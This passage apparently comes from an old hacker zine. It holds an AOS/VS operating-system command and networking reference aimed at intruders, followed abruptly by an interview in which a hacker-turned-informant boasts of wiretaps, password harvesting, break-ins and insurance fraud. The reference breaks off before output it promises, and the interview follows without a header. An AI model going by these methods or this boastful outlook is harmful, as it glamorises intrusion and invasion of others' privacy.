are displayed when typing WHOS.  For example, SEND 2 FU I&#039;M A HACKER.


STRING [arg]
------------

Without an argument, STRING displays the contents of the CLI&#039;s string.
Displayed strings have commas inserted in them instead of spaces.
If an argument is present, the string is set to it.

/K        Set string to null.

/P        Set string to the the string in the previous environment (each
          CLI level can have a different string).


SYSLOG [log file name]
----------------------

SYSLOG handles system logging activity; therefore, SYSLOG can only be
run with PID 2 (the master console) or with SYSTEMMANAGER privileges
turned on.  &quot;System logging&quot; logs user information (processor usage, I/O
usage) in :SYSLOG.  System logging can be ran under several levels of
detail, so that it may or may not record everything going on (like file
accesses).  &quot;Superuser logging&quot; are things caused by a superuser who
will only be logged under the maximum detailed level; therefore, it&#039;s
possible to log them separately, and not record everything else
everybody else does.  &quot;Error logging&quot;, which logs power failures, hard
errors and such is always on and goes to :ERROR_LOG.  Finally, there&#039;s
&quot;CON0 logging&quot;, which logs all activities on the master console, in such
a way, that if you view the CON0 log from CON0, the log will never
end...

/CON0/[START|STOP] [filename]

          Start or stop CON0 logging.  The older CON0 log will be
          renamed into [filename], and a new log will be opened.
          Otherwise, the old log is appended to.

/DETAIL=[FULL|MINIMAL]

          Sets (or changes) the level of detail when logging.  The
          default is MINIMAL; FULL is mostly for security matters.

/NOSOFTTAPEERRORS
/SOFTTAPEERRORS

          Don&#039;t (or do) record soft tape errors.

/RENAMEERROR

          Rename :ERROR_LOG to something else, and keep on logging to a
          new file.

/START [filename]
/STOP
          Start (or stop) logging to :SYSLOG.  If [filename] is given,
          rename :SYSLOG to it and keep on logging to a new file.

/SUPERUSER/[START|STOP]

          Start (or stop) Superuser logging.  System logging must
          already be running.

/VERBOSE  Give a detailed status.

Here&#039;s a system you wouldn&#039;t want to be on:

SmSu) SYSLOG/START BEFORE_WE_WERE_HACKED
SmSu) SYSLOG/DETAIL=FULL
SmSu) SYSLOG/CON0=START


WHO [hostname:]
---------------

WHO shows information about processes.  Without arguments, it shows
your processes&#039; information.  If WHOS is issued, information on all the
processes is displayed.  The output from WHO is similar to this:

Elapsed 109:21:22, CPU  0:00:35.828, I/O Blocks    0, Page Secs 22186
PID:     1 PMGR            PMGR            :PMGR.PR

&gt;From left to right, WHO displayed the process ID; username; console;
and program pathname.


WRITE [arg]
-----------

Displays [arg], by default to @OUTPUT.  [arg] can also be a pseudo macro
such as [!USERNAME].

/FILEID=file

          Write [arg] to the file specified in file.

/FORCE

          Forces the system to write immediately instead of periodically
          writing the files.

/NONEWLINE

          Don&#039;t include the newline in the output.


XEQ &lt;path&gt;
----------

XEQ is identical to EXECUTE; it executes the program in path (how QT).
The path should be to a file with a PR (PRogram) suffix, although it
doesn&#039;t have to include .PR.

/I        Takes input from @INPUT, eg from the user.  To end the input,
          type &#039;)&#039; and Return.

/M        Takes input from a macro that follow.  The input end the same
          way as with /I.

/S        Stores the termination message in a STRING instead of the
          terminal screen (@OUTPUT).

THE &#039;EXEC&#039; PROGRAM
~~~~~~~~~~~~~~~~~

EXEC does more than just log users on.  EXEC is the program that handles
the AOS/VS multiuser environment.  If handles user logins, but also
batch, print, and networking queues, printers, and tape mount requests.

To use any EXEC command, you must either have the username of the EXEC
user (usually OP) or have SYSTEMMANAGER privileges on.  Alternatively,
if you have the right ACL (if you&#039;re the owner) of the device you&#039;re
executing an EXEC command on, it will also work.

EXEC commands are issued in this manner: CONTROL @EXEC COMMAND.  EXEC
has its own help facility, called XHELP, which gives help only on EXEC
commands.

These are the EXEC commands (alphabetically, once again):

ACCESS           CREATE          HOLD           PREMOUNT       STOP
ALIGN            DEFAULTFORMS    LIMIT          PRIORITY       TERMINATE
ALLOCATE         DELETE          LOGGING        PROMPTS        TRAILERS
BATCH_LIST       DISABLE         LPP            PURGE          UNHOLD
BATCH_OUTPUT     DISMOUNTED      MAPPER         QPRIORITY      UNITSTATUS
BINARY           ELONGATE        MDUMP          REFUSED        UNLIMIT
BRIEF            ENABLE          MESSAGE        RELEASE        UNSILENCE
CANCEL           EVEN            MODIFY         RESTART        VERBOSE
CLOSE            FLUSH           MOUNTSTATUS    SILENCE
CONSOLESTATUS    FORMS           OPEN           SPOOLSTATUS
CONTINUE         HALT            OPERATOR       START
CPL              HEADERS         PAUSE          STATUS

ACCESS         Change the ACL of files in the :PER directory.  If some
               has OWNER access to a device or queue, he can issue an
               EXEC CONTROL command to it.  If he had READ or WRITE
               access to a queue, he can display it or add jobs to it,
               accordingly.  The default ACL is +,RW (READ/WRITE access
               for all users).  The :PER directory contains devices
               (such as consoles, printers, etc) and queue jobs.

ALIGN          Tells the printer handler to stop printing (giving the
               operator a chance to align the paper).

ALLOCATE       Restore a tape unit to EXEC&#039;s list of mountable tape unit
               (will show on UNITSTATUS).

BATCH_LIST     Change the print queue to which a batch&#039;s listings go.

BATCH_OUTPUT   Change the print queue to which a batch&#039;s output go.

BINARY         Tells the printer handler to set or disable BINARY mode.
               When in binary mode, passes everything sent to the
               printer as-is.  When binary mode is off, the printing
               handler catches characters and changes them so they&#039;ll
               have a meaning on the device.  Binary mode is necessary
               when using a graphics printer, for example.

BRIEF          Opposite of VERBOSE.

CANCEL         Cancels a waiting queue entry.

CLOSE          Prevents a queue from accepting more requests.

CONSOLESTATUS  Displays the status of an EXEC-handled EXEC.  Displays
               the console&#039;s name, maximum number of login tries
               allowed, the PID, and which user is logged on (if at
               all).

CONTINUE       Continue a device after changes (for example, running
               START) have been made to it.

CPL            Changes the number of characters per page for a device.

CREATE         Create a queue.

DEFAULTFORMS   Where the default formatting specs are.

DELETE         Delete a queue.

DISABLE        The opposite of ENABLE.

DISMOUNTED     Dismount a tape mounted with CONTROL @EXEC MOUNT.

ELONGATE       Turns elongated printing on a DASHER LP2 printer on or
               off.  When printing in elongated printing, the characters
               are wide.

ENABLE         For more information, see the section titled &quot;System
               Security&quot;.

EVEN           Sets the status of pagination on a printer.  When on, all
               files are printed as if they have an even number of
               pages, for cosmetic reasons (all header pages come on the
               same fold of paper [yes, it sounds disgusting]).

FLUSH          Terminate the currently running job on a device or queue.

FORMS          Use the formatting specs in a filename for a certain
               printer.

HALT           Terminate EXEC.

HEADERS        Change number of headers printed when printing (default
               is 1).

HOLD           Suspends a batch or printer queue until UNHOLD is issued.

LIMIT          Enforces limits on CPU processor time or number of
               printed pages on devices or queues.

LOGGING        Where to send error and status messages instead of CON0,
               the system console.

LPP            Sets the number of lines per page when printing.

MAPPER         Tells the printing handler to use character mapping as
               defined in a given filename.

MDUMP          Suspend all other EXEC activities to create a memory dump
               in the :UTIL directory.

MESSAGE        Append a message to EXEC&#039;s log.

MODIFY         Modifies the parameters of an inactive queue entry.

MOUNTSTATUS    Displays the status of all user mount requests.

OPEN           Opens a queue to receive user requests.

OPERATOR       Whether or not there&#039;s an operator available to help with
               diskette dumps (remember what the OPERATOR privilege is
               used for; not everyone has it).

PAUSE          Suspends processing of a queue or on a device.

PREMOUNT       Mount a labeled tape volume even before a user request it
               be mount (and thus the operator doesn&#039;t get prompted when
               users try to mount it; they immediately get access).

PRIORITY       Changes the priority and/or process type for batches or
               printing processes.

PROMPTS        Whether EXEC will display the time after each command.

PURGE          Delete all inactive entries in a queue.

QPRIORITY      Limit a batch or device to only job with a certain queue
               priority (or in a range of priorities).

REFUSED        Refuse a MOUNT request.

RELEASE        Remove a tape unit from the list of mountable unit (it
               won&#039;t be displayed with CONTROL @EXEC UNITSTATUS.

RESTART        Restart a job, and if printer job, can specify from which
               page until which page to print.

SILENCE        Suppresses EXEC messages about a device or a batch.

SPOOLSTATUS    Give device and queue information.  If no devices or
               queuenames are given, it reports each spooled device and
               the queue associated with it, CPL, LPP, headers,
               trailers, binary mode status, form specifications,
               priority and process type.

START          Make a connection between a queue and a device.  Jobs for
               the queue will be run on the device.  This is need for
               something like printing queues.

STATUS         Describes the status of devices or batches.  It reports
               the sequence number, queue priority, user, and PID.  For
               a printer, it also reports the number of pages left and
               number of copies left.

STOP           Dissociate a queue from a device.

TERMINATE      Terminate the user process on a console (disconnects user).

TRAILERS       Changed number of trailers printed when printing (default
               is 0).

UNHOLD         Release from HOLD.

UNITSTATUS     Displays mount status of a tape unit or all units if no
               devicename is specified.

UNLIMIT        Release from LIMIT.

UNSILENCE      Release from SILENCE.

VERBOSE        Give detailed messages.  Brief messages include the
               queue&#039;s name, sequence number and user.  Verbose messages
               also include the PID and pathname.  Messages are sent
               when a device or a batch processes a request.

NETWORKING
~~~~~~~~~

AOS/VS is compatible with several networking protocols.  The most widely
known and used are X.25 and TCP/IP.  There is also Data General&#039;s XODIAC
network, as well as PCI networks and many others.  In general, network
services are run as process by the NETOP username (usually &quot;OP&quot;), and
have programs for the users to execute.  The NETOP process handles
communications and report generating to the other networking processes.
It has similar restrictions to that of the EXEC process (one must have
its username to control it, and so on).

Before going into specifics, there are some general details about
networks.  Almost everything having to do with networking -- from hosts,
to help files and programs, will be found in the :NET directory.
Programs and macros will be in :NET:UTIL, and so on.  The :PER
directory, which contains devices, contains devices for the networking
processes.

TCP/IP:  The AOS/VS implementation of TCP/IP incorporates the usual
TCP/IP programs: rlogin, rsh, telnet, ftp, smtp and so on.  Because of
the way most of these programs were built (with strong relationships to
Unix), AOS/VS work in a similar way.

AOS/VS runs RSHD, for remote logging in, and supports individual .RHOST
files as well as HOSTS.EQUIV files; TELNETD, for telnet sessions; FTPD,
for ftp sessions; SNMPD, for network management; and SMTP, which is the
same as activating the AOS/VS SENDMAIL with the become daemon switch,
for receiving mail.  There are also programs for remote printing and
dumping of files on tapes, as well as NSLOOKUP and NETSTAT.

In the :ETC directory, there will be some general TCP/IP files, and in
:USR:LIB there will be spool directories for mail and printing services.
The files normally found in :ETC will usually match the format and
function of their counterparts on Unix (for example, :ETC:HOSTS =
/etc/hosts, and so on).  However, some explaining is necessary.

The file :ETC:PASSWD does not contain any passwords.  It exists for the
use of the SENDMAIL program, for looking up local users on the machine.
Thus if someone sends mail to a local user, mail will be sent only if
that user has an entry in :ETC:PASSWD.  An example file would be,

op::0:::/udd/op:
mail::8:::/usr/spool/mqueue:

:ETC:SNMPD.TRAP_COMMUNITIES contains a list of hosts, ports, and
communities that the SNMPD process will send traps to (a SNMP trap is a
message sent indicating a change of state).

:USR:LIB contains mail programs, such as SENDMAIL&#039;s aliases file, the
SENDMAIL program itself, the SENDMAIL.CF (configuration file) and so on.

:USR:SPOOL contains spool directory, for printing (like LPD) and mail
(MQUEUE).

The format for sending mail on AOS/VS using SMTP is just like on Unix,
only the program name is SENDMAIL.

The AOS/VS TCP/IP installation usually comes with TCP libraries, such as
SOCKIT.LB, which provides ordinary Unix socket functions, from bind(),
connect(), and listen(), to gethostbyaddr(), getservbyport(), etc;
making it possible to program and compile network applications using
TCP/IP routines and the AOS C compiler.

For more information about these services, and network programming, read
a file about TCP/IP and/or Unix.

AOS/VS NETWORK PROCESSES:  Each network process usually comprises two
other processes, one for local users, and one for remote users on the
local host.  RMA provides URMA and SRMA; FTA provides UFTA and SFTA, and
so on.  What does it mean?  Simply, the S+ programs are &quot;daemons&quot; for
the network actions, and the U+ programs are user executable programs.
All the S+ programs are controlled through the NETOP process, while the
user programs are executed as programs by individual users.

I will take some time to explain these programs and how they work.  RMA
stands for Resource Management Agent.  FTA stands for File Transfer Agent,
and VTA stands for Virtual Terminal Agent.  The &#039;U&#039; in the programs stands
for &quot;Using&quot; and the &#039;S&#039; for &quot;Serving.&quot;

VTA: the SVTA process provides virtual terminals for remote UVTA users,
as well as PAD support through PDNs; it controls the system&#039;s link to
any PDN.  Connections can be made from public PADs (like Telenet), and
through UVTA or any other PAD interface.  SVTA logs command responses
and errors by reporting them to the NETOP process, or a facility set by
CONTROL @SVTA SET/OUTPUT= and /LOG=.  If an error occurs during this
logging, OUTPUT is reset to the NETOP process (if something is faulty
with the NETOP process, the message is lost).

SVTA is controlled through the NETOP process, so SVTA commands are the
format of &quot;CONTROL @SVTA &lt;command name&gt;&quot;.  SVTA commands:

SET            Sets miscellaneous SVTA parameters, such as whether to
               include the current time or date at SVTA prompts
               (/TIME or /NOTIME, /DATE or /NODATE); where and if to send
               the SVTA process&#039; output (/OUTPUT=[pid #] or [@console] or
               [process name], or /NOOUTPUT); and where to write SVTA logs
               (/LOG=file).  Logs files are of format
               SVTA_month_day_year.LOG and is stored in :NET:LOGFILES
               (unless changed).

OWNER          Assigns a process name to the SVTA process.  If no name
               is given, SVTA returns its current process name.

REVERSE        ON or OFF.  Tells SVTA whether or not to accept reverse
               charged (collect) calls over the PDN.

STATUS         If no argument is given, SVTA issues a global status
               report.  If an argument is given, it can either be
               @VCONnn -- an SVTA controlled virtual console, or a PID (a
               report will be generated for all VCONs owned by that PID).

The user side, UVTA, is loaded by XEQ UVTA.  The user is faced with a
prompt, from which he can start connections and issue other UVTA
commands.  UVTA commands:

CALL &lt;host&gt;    First and formost, call a remote host.  A remote host is
               a host that has its name in the :NET directory (file type
               HST).  If UVTA can&#039;t locate the host in the :NET
               directory, it reports that the file does not exist.  CALL
               accepts two arguments, the remote host and the remote
               process.  Remote process in in the format of [user]:process.
               [user] defaults to OP; when this parameter is given, UVTA
               attempts to connect to a VCON controlled by that
               process/user combination.  The remote process defaults to EXEC
               (OP:EXEC), which means the user connects to a console controlled
               by the EXEC program (and faces the usual login procedure).
               CALL can be replaced by loading UVTA with CALL&#039;s
               parameters.

               Trying to use UVTA as a sort of RLOGIN by connecting to
               CLIs will probably not work, since unless the remote CLI
               has opened a VCON, you will get flooded with &quot;Remote user
               refused connection&quot; error messages, until you abort UVTA
               or that CLI does open a console -- all of this, of
               course, assuming that user is there in the first place
               and you won&#039;t get a &quot;Process unknown&quot; error message.

               Once connected, ^C^V will abort the call and the UVTA
               process.  ^C^T will break from remote mode to the local
               UVTA prompt.

RCONTROL       The control character (not including Ctrl-C) to break
               from remote mode to the local prompt.  &#039;A&#039;, &#039;B&#039;, &#039;E&#039;, &#039;Q&#039;,
               &#039;S&#039; and &#039;V&#039; are taken by the system and cannot be used.

EXECUTE &lt;prog&gt; Execute the parameter issued as a son process of your
               UVTA (this will fail if you don&#039;t have the privilege to
               create son processes without blocking the father).

The File Transfer Agent, FTA, is something like the FTP port to X.25.
A user using UFTA can connect to a host running SFTA, supply a valid
username/password pair, and transfer files from or to the remote host.

A short summary of UFTA commands, in the order they are usually executed:

CALL &lt;host&gt;    Connect to the remote host, given as an argument.
               Once connected, a ^C^A sequence will abort a transfer in
               the middle.

USER &lt;account&gt; Supply a username to the remote host, or if no argument
               is given, assume the local username to be identical to
               the remote one.  In any case, a password must be
               supplied.

SUPERUSER      If the user given through USER has Superuser privileges,
               will turn them for the file transfers (you can now take
               or put files that you couldn&#039;t before, because of the
               ACLs).

FILES &lt;path&gt;   FILES takes one argument, being the directory which
               contents will be listed.  FILES takes most arguments the
               CLI FILES takes (/ASSORTMENT, /TYPE, etc).

TYPE &lt;file&gt;    Display a remote file.

STORE &lt;l&gt; &lt;r&gt;  Transfers the local file, &#039;l&#039;, to the remote destination
               file, &#039;r&#039;.  STORE will fail if the user is not privileged
               for the action, or if he is trying to transfer an
               irregular file, such as a network host file.
               Switches are: /APPEND, to append the file to the
               destination; /COMPRESS, to compress data for the
               transfer, and /DELETE, to delete the destination file if
               it already exists.
               File transfer modes are controlled through the /BLOCK and
               /RECORD switches.  /BLOCK, the defaults, means
               block-by-block transfers, and /RECORD means to transfer
               each record in the file at a time.

RETRIEVE &lt;l&gt; &lt;r&gt;  Transfers a remote file, &#039;r&#039;, to the local destination,
                  &#039;l&#039;.  The same restrictions and switches for STORE apply
                  here.

RECOVER &lt;id&gt;   RECOVER is the command used for recovering aborted
               transfers.  Both STORE and RETRIEVE have another
               switch called /RECOVER.  When used in conjunction with
               that switch, the transfer request&#039;s working set is kept.
               Thus, if a transfer was stopped by ^C^A, it can be
               resumed by RECOVER.  Without the &quot;id&quot; argument, RECOVER
               lists all the transfer IDs (which are actually interrupted
               transfers) it can recover.

SEND &lt;msg&gt;     Will send &quot;msg&quot; to the operator on the remote host.
               The message is sent to the SFTA on the remote host, and
               forwarded to the operator from there.

The X25 process controls X.25 connection over the AOS/VS network.  It
controls accounting, virtual connection handling, links, and so on.  X25
commands, operated through the NETOP process (CONTROL @X25):

ACCOUNT        Enable or disabling the accounting function of X25.
NOACCOUNT

STATUS &lt;vc#&gt;   Displays the status of a virtual connection.  It displays
               the remote address, number of packets passed, connection
               state and the user of the connection.

               Note that virtual connection numbers are reported by X25
               as octal numbers and are therefore read as such.

CLEAR &lt;vc#&gt;    Clears a virtual connection, after informing its local
               owner of the clear.

CUSTOMERS      Displays a list of X25 customers, meaning processes which
               have connected to and have not yet disconnected from X25,
               and are therefore known by it.

LSTATUS        Displays a status report about a logical link (host).
               The report gives details about the device status and
               number of bytes tranfered.

TRACE &lt;file&gt;   Starts a trace of an X.25 connection to the file
NOTRACE        specified as the argument.  X25 defaults to trace
               everything -- anything coming out of or going into the
               system, however this can be overridden by using /LINK=link
               to trace connections to a specific link, /VC=oct# to
               trace a specific virtual connection, or PID=pid# to trace
               virtual connections owned by the process given.

               NOTRACE stops the trace.

               X25 trace files must be displayed through another network
               utility (not an X25 subcommand), called NTRACE.
               NTRACE takes as an argument the file in which X25 stores
               trace info, and displays it in human readable format
               according to its switches, which are: /DIRECTION=[BOTH|INCOMING
               |OUTGOING], for packet directions (defaults to BOTH);
               /LIST=file, for the file to which output goes (defaults
               to the terminal); RLENGTH=[ALL|#], for the number of
               bytes from the packets to be displayed (defaults to ALL).
               The last switch is the packet types to be displayed
               (default to every packet), and is:

Type                 Incoming calls                  Outgoing calls
-------------+--------------------------------+--------------------------
/CALL                Incoming call                  Call request
/CONNECT             Call connected                 Call connected
/CI                  Clear Indication               Clear request
/CCFM                Clear ConFirMation             Clear confirmation
/DATA                Data                           Data
/INTERRUPT           Interrupt                      Interrupt
/INTCFM              Interrupt confirmation         Interrupt confirmation
/RCVR                RR - receive ready             RR
/RNR                 RNR - receive not read         RNR
/REJ                          --                    REJ - reject
/RSTIND              Reset INDication               Reset request
/RSTCFM              Reset confirmation             Reset confirmation
/RRTIND              Restart indication             Restart request
/RRTCFM              Restart confirmation           Restart confirmation

               The 2nd and 3rd columns in the chart specify what the
               packet means if the local host is being connected to
               (incoming call) or is trying to reach another host
               (outgoing).

RESOURCES &lt;pid&gt; Displays any connections owned by &lt;pid&gt;.  &lt;pid&gt; can be a
               process ID, or of the format username:processname.

One of the more interesting programs in XODIAC networking is NETGEN.
NETGEN (in :NET:NETGEN) is a program used to configure the network: host
addresses, routes, services, and so on.  When NETGEN is loaded, it
enters interactive mode and enables the user to configure and change
network settings from menus.  Later, it can be called using its one and
only switch, /RECREATE=&lt;path&gt;, to re-create the network files in :NET
according to the specification file given in &lt;path&gt;.

NETGEN&#039;s main menu, gives three options (other than terminating).
Creating or modifying a specification file, and creating configuration
files.  The specification file contains in it,

     o details pertaining to the local host&#039;s configuration on the
       network: the host ID, host name, domain, etc;

     o hardware device configuration: device name, type, code, and
       miscellaneous details varying from device type to another;

     o link configuration: link name, device name/type it uses, and
       (changing on the type of device), network type, line number,
       protocols, X.25 packet configuration (size/window size/retries),
       duplex, and more;

     o general network attributes: extended addressing, diagnostics,
       calling DTE in outgoing calls, etc;

     o X.25 configuration: packet/window size negotiation, reverse
       charging, NUIs, etc;

     o virtual calls configuration: permanent virtual calls, VC
       numbering, etc;

     o remote host configuration: X.25 parameters, link to be used,
       address (decimal/hex), name, host file name, etc;

     o network processes configuration: name, ACL, and other details
       (varies).

Upon loading NETGEN, there are about three menus branching off from
every option, so I cannot really mention everything.  However, since
it&#039;s mostly self explanatory, I am putting in here the output from
NETGEN&#039;s Print Specifications entry, edited to show X.25 links through
Telenet and the local configuration, plus TELNETD.  By looking at it,
one might learn how NETGEN looks/operates, and what details are
available.

This file was created using (from the main menu): 2. Access/Update Spec
File =&gt; 7. Print Configurations =&gt; file (instead of @LPT).

An Interview With Agent Steal
By Mike Bowen, Agenta  Aka Agent 005

Please note that all of the information in this interview is
documented in F.B.I. files and can be verified.
______________________________________________________________________

MB: Well I guess the first question is the biggest one. Is it true that
    you are an F.B.I. informant?

AS: Yes.

MB: Why?

AS: First of all I didn&#039;t have that much of a choice. If I didn&#039;t
    cooperate with The Bureau, I could have been charged with possession
    of classified government material. That carries a penalty of over
    10 years. There is not a lot of people that I would go to jail that
    long for. I was able to keep my two closest friends out of trouble.
    That was part of my deal. It was already too late for Kevin Poulson
    and Ronald Austin.

MB: Yeah, I think that most hackers would have done the same as you.

AS: Most hackers would have sold out their mother.

laughter

MB: How come you never busted me?

AS: Well I certainly had the opportunity to. You probably remember that
    I was calling you about a year ago and poking you for information.
    I just didn&#039;t consider you to be a dangerous or malicious hacker.

MB: Thanks, I guess.

AS: Just make your check out to....

laughter

MB: As everyone should know, Kevin Poulson &quot;Dark Dante&quot; was your partner.
    That was what you referred to in your BBS posts as The Inner Circle
    1990. Poulson was featured on TV&#039;s&#039; Unsolved mysteries as a wanted
    fugitive hacker. The United States Attorney called him, &quot;The Hannibal
    Lecter of computer crime&quot;.

AS: I would not compare him to Lecter, I would say he is more of a
    G. Gordon Liddy.

laughter

MB: Regardless, Kevin is now in jail awaiting trial in San Francisco. He
    has been there for two years and when he is done, there are more
    charges awaiting him in Los Angeles. He may spend up to 15 years
    in prison. How much time do you think that you will do?

AS: The six months I did in Texas while I was negotiating my plea agreement
    will probably be it.

MB: How many people did you have to bust to get out of that one?

AS: I&#039;m not at liberty to say

MB: I see. So are you still involved with the F.B.I.?

AS: I believe that my cover is pretty much blown at this time so my
    usefulness is limited. I would say that I&#039;m done. However, I have
    received several other offers to work with other computer security
    related organizations. So watch your asses kiddies, it&#039;s easy to
    change my handle!

MB: Why do you think you are getting these offers? You are a convicted felon.

AS: I guess I have an honest face, heh, and the work I did for the
    bureau was very good. I think I was cut out to be in the investigative
    business.

MB: Well, you have been working for private investigators for quite some time.

AS: Yes, I handled all of their computer information searches in addition to
    phone tapping, break ins, phone tap and bug detection.

MB: Was that profitable?

AS: Well, in addition to all of those radio station contests we were
    winning, I was doing OK. Driving a Porsche and living in Beverly
    Hills wasn&#039;t to bad.

MB: I guess all good things come to an end.

AS: I will always manage some how, I&#039;m a survivor.

MB: There was another partner involved with you. Wasn&#039;t his name Ron Austin?

AS: Yes, he got busted too.

MB: How much trouble is he in?

AS: He is going to testify against Poulson also, so he&#039;ll probably only get
    a year or two.

MB: Are you two still friends?

AS: Very much so. He understood the situation I was in. I still talk to him
    frequently.

MB: What is he up to these days?

AS: He told me he was going to find a cause and become the first computer
    hacker turned international terrorist.

laughter

MB: I wouldn&#039;t want to be his enemy! Speaking of enemies, what do you think
    Poulson will do to all the people who testified against him when he gets
    out?

AS: Well he is going to be busy. Everyone who he has ever known has turned
    against him.

MB: Well if he wasn&#039;t such a sneaky jerk maybe someone would like him.

AS: He brought it on himself.

MB: Do you expect any retaliation from the hacker community?

AS: There will probably be a few narrow minds out there. However, I have
    been very careful to conceal my true identity. People may know my real
    name if they read the papers, but that won&#039;t get them far. I find
    people for a living, I don&#039;t think it will be hard to use what I know
    to keep a low profile. Besides, what is a hacker going to do, turn off
    my phone? Regardless, If some one fucks with me, I&#039;ll just have to fuck
    back. I have a lot of friends and resources now.

MB: What was it like working with the F.B.I.?

AS: Very interesting and educational. I have learned a lot about how the
    bureau works. Probably too much. Obviously I can&#039;t say very much.
    However, I can say that my involvement was extensive. There was a lot
    of money and resources used. In addition, they paid me well.

MB: Would you say it was fun?

AS: Most of the time. They actually flew me to Summer Con in St. Louis.
    I would say the bureau had that conference pretty well covered.
    Erik Bloodaxe was there too. It was pretty funny. I think we both knew
    that each other was working for the bureau. One of the agents I worked
    with let it slip out. We were sitting across from each other at the
    conference, kind of smirking at each other. And the balls Erik had!
    He video taped the whole thing! It was classic.

MB: What was the F.B.I. trying to accomplish?

AS: I believe they were trying to send a message that high level computer
    hacking is something that is very serious. In Poulson&#039;s&#039; case as you are
    aware, we got into some really heavy shit. So heavy in fact that I had
    to sign an agreement that I would never disclose any of the top secret
    information that I had seen.

MB: That&#039;s pretty wild. The article about Poulson, Austin and you in
    The Los Angeles Times Sunday Magazine was really interesting. For
    those who want to read it the date was September 12, 1993.

AS: I was amazed how deep that reporter was able to go. He really hit the
    nail on the head. Personally I think he wrote too much. He wrote that
    we were able to get a list of every federal wire tap in California!

MB: Really?

laughter

AS: Like I said, I can neither confirm or deny that statement. There is
    still a lot of information regarding our activities that has not been
    published. Between the three of us, we were into a bunch of shit. One
    of these days, it will all be out.

MB: The reporter also said you would take control of phone lines with
    a telephone company computer. Then you would seize radio station lines
    and win contests.

AS: Now that we can talk about. We won tens of thousands of dollars, trips
    to Hawaii and a few Porsches. The government took both of my Porsches
    away from me.

MB: I didn&#039;t realize that you had two.

AS: Yeah, a friend of mine was selling his. So I had him report it stolen
    and collect the insurance. I gave him a $1000 and it was mine. I
    loved that car.

MB: I see that was the interstate transportation of a stolen automobile
    charge that was filed in Texas?

AS: Yeah , I changed the VIN numbers and everything. It was really clean.
    However, when I got raided they went over everything with a fine tooth
    comb. There were so many agencies involved. The F.B.I., The Secret
    Service , SW Bell Security, Pacific Bell Security, Dallas Sheriff,
    L.A.P.D. Computer Crime Unit, The United States Postal Inspector,
    Telenet and Tymnet Security and eventually The Department of Motor
    Vehicles Security Unit. What a mess, everyone wanted a piece of
    the action. But you know who always gets their man.

MB: The Bureau.

AS: Yep, pissed a few people off too.

MB: Where did you get the name Agent Steal?

AS: About ten years ago, I was under investigation by The Secret Service
    for computer hacking. The case agent was Special Agent Steele. That
    is when I became a fugitive. I left town, dropped contact with my
    friends, and changed my name. I moved to California.

MB: What are some of your favorite hacks?

AS: Probably the Telenet tap I put up.

MB: You mean the private dial up tap that you had told me about?

AS: Yeah, I placed the order in COSMOS for a bridge lifter on the first
    line in hunt of my local Telenet dial up and a 1FR to appear in an
    office building a half mile from the LA Telenet dial up.

MB: That was great. That device you built was cool. All you had to do was
    dial up the number, connect with your modem and you could sit there
    and watch people type in their passwords all day long.

AS: I must have snagged over 500 accounts on that thing.

MB: That&#039;s where you got your DMV account wasn&#039;t it?

AS: Yes. I made a small fortune reselling the information to P.I.s&#039;

MB: What was it you told me about tapping Heidi Fliess?

AS: Yeah. I tapped the phone of one of her working girls. It was for this
    rich guy who would hire hookers and then get involved with them. He
    loved hookers. He used to keep tabs on this one.

MB: What were the conversations like.

AS: I rarely would listen to the tapes I made. I have a life, thank you.
    Besides, I have found that about 99.9% of all phone conversations
    are really boring.

MB: Have you listened to many?

AS: Thousands, from cellular to cordless to inter office T-carrier lines
    to long distance microwave. I guess I am a phone tap expert. Poulson
    and I would break into C.O.s on a regular basis. We had our own keys
    and I.D. badges. We came and went as we pleased. I would sometimes
    play around with the long distance trunks. That was always interesting.
    With a T-carrier test set you could scan through all of the channels
    and hear dozens of phone calls with the flick of a switch.

MB: What is the most powerful computer that you had access to.

AS: Good question. There really isn&#039;t one computer system out there that
    is &quot;all&quot; powerful, with the exception of maybe some defense
    computers. I made a point of staying away from those. However, if
    I had to pick just one computer to have access to I would say it
    was XXXXXXX. That was the Pacific Bell system that allowed us to
    drop in and monitor and control phone lines from home with the use
    of a computer system. Second would have to be DMV or COSMOS.
    Yes COSMOS. I thought that being able to place my own orders was
    important, not to mention more reliable than the business office.

MB: Cheaper too.

laughter

AS: I wish I had all the money I have saved on phone bills!

MB: Those days are gone.

AS: At least the days of doing that safely. People tend to get pessimistic
    about hacking. I have heard some say that the good old days of boxing
    and such are gone. I disagree, we just have to adapt. As sure as
    technology advances so will hacking. There will always be new &quot;hacks&quot;.
    It&#039;s up to the real hackers to find them. Learn from the past and move
    on or get busted and quit.

MB: What is up with Kevin Mitnick?

AS: I had never met him before I was busted. When I went to work for the
    bureau I contacted him. He was still up to his old tricks so we opened
    a case on him and Roscoe. It&#039;s a long story but they wound up getting
    busted again. Mitnick got tipped off right before they were going to
    pick him up. So he&#039;s on the run again. Roscoe wasn&#039;t so lucky. This
    will be Mitnick&#039;s fifth time to get busted. What a loser. Everyone
    thinks he is some great hacker. I out smarted him and busted him.
    Poulson blows him away as well.

MB: Do you feel bad about working undercover to arrest hackers?

AS: Not really. We all know the risks. For me it was just a job. And an
    interesting one at that. I wasn&#039;t out there just busting anyone. We
    were looking for the hard core malicious hackers. I passed up a lot
    of people in the course of the investigation. They should know who
    they are by now. The ones that got taken down deserved it. It will
    all be in the papers some day.

MB: Did you deserve what you got.

AS: Yeah, I was getting pretty carried away there for a while. I invaded a
    lot of peoples privacy. Phones taps, credit reports, breaking into
    Pacific Bell offices etc.

MB: Didn&#039;t you break into PacBells&#039; security department?

AS: Yes, Poulson and I broke into the high rise downtown. We wanted to
    find out how far their investigation of us had gone.

MB: Did you find what you wanted?

AS: Yeah, DNR print outs, notes and photos! We also found a lot of
    information regarding other investigations and how they do wire taps.

MB: Very dangerous in the wrong hands.

AS: We are the wrong hands.

laughter

MB: Oh yeah. How did you get caught?

AS: Well as you know I moved to Texas after that high speed chase with the
    L.A.P.D. undercover units. I found out that I was under surveillance
    and had to make a run for it!

MB: Was that pretty close?

AS: In a Porsche on a canyon road? Not until the helicopter appeared!

MB: How did you get away?

AS: I parked the car in a garage after losing them then hid under another
    car for three hours. They eventually gave up looking. I called a
    cab with my cellular phone and left the area. Getting back to getting
    caught. I believe it was from an elaborate multi-company phone trace.
    I didn&#039;t think that they would go through all the trouble to try and
    trace my calls though several carriers. But I guess they did. The
    Pacific Bell people were very hot for me. They must have pulled everyone
    together.

MB: This sounds like a book or a made for TV movie.

AS: One can only hope.

                 Volume Four, Issue Forty-Four, File 17 of 27

****************************************************************************



[Editor&#039;s commentary:

 What you are about to read is a file that everyone&#039;s friend
 Pat (Visionary / Traxxter) had written some time ago and is
